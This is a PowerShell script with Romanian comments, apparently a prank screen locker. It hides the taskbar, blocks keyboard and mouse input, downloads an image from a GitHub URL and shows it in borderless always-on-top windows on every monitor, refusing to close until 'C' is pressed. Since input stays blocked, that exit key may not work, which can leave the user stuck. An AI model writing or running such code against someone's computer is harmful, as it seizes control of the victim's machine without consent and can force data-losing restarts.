Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod pentru input și taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Ascunde Taskbar
$taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
[Native]::ShowWindow($taskbar, 0)

# Blochează input
[Native]::BlockInput($true)

# Descarcă poza
$temp = "$env:TEMP\poza_laptop.jpg"
Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing

# Variabilă de control globală
$script:inchis = $false
$forms = @()

# Funcție care închide tot
function InchideTot {
    $script:inchis = $true
    [Native]::BlockInput($false)
    [Native]::ShowWindow($taskbar, 1)
    foreach ($f in $forms) {
        try { $f.Invoke([Action]{ $f.Close() }) } catch {}
    }
}

# Creează ferestre pe TOATE monitoarele
foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form
    $form.StartPosition = 'Manual'
    $form.Bounds = $screen.Bounds
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.ShowInTaskbar = $false
    $form.BackColor = 'Black'
    $form.KeyPreview = $true
    $form.Cursor = [System.Windows.Forms.Cursors]::None

    $img = [System.Drawing.Image]::FromFile($temp)
    $pic = New-Object Windows.Forms.PictureBox
    $pic.Image = $img
    $pic.Dock = 'Fill'
    $pic.SizeMode = 'Zoom'
    $form.Controls.Add($pic)

    $form.Add_KeyDown({
        if ($_.KeyCode -eq 'C') { InchideTot }
    })

    $form.Add_FormClosing({
        if (-not $script:inchis) { $_.Cancel = $true }
    })

    $null = $form.Show()
    $forms += $form
}

# Buclă până se apasă C
while (-not $script:inchis) {
    Start-Sleep -Milliseconds 200
}
